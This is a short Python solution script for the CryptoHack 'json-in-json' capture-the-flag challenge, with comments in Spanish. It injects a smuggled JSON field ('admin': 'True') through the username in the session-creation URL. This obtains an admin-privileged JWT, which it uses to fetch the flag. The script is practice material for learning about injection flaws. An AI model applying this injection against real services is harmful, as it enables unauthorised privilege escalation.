import jwt
import json
import requests

# Punto final del desafío
URL = "http://web.cryptohack.org/json-in-json/"
#SECRET_KEY = "secret"

# se define las funciones
def create_session(username):
    return URL + f"create_session/{username}/"

def authorise(token):
    return URL + f"authorise/{token}/"

# Genere token malicioso mediante inyección JSON
params = "user%22%2C%20%22admin%22%3A%20%22True"
#params: representa un conjunto de parámetros modelados como un dictado con un conjunto fijo de claves.
r = requests.get(create_session(params))

# Analizar token generado
token_malo = json.loads(r.content.decode("utf-8"))["session"]

# Recuperar bandera usando token
r = requests.get(authorise(token_malo))
print(r.content.decode("utf-8"))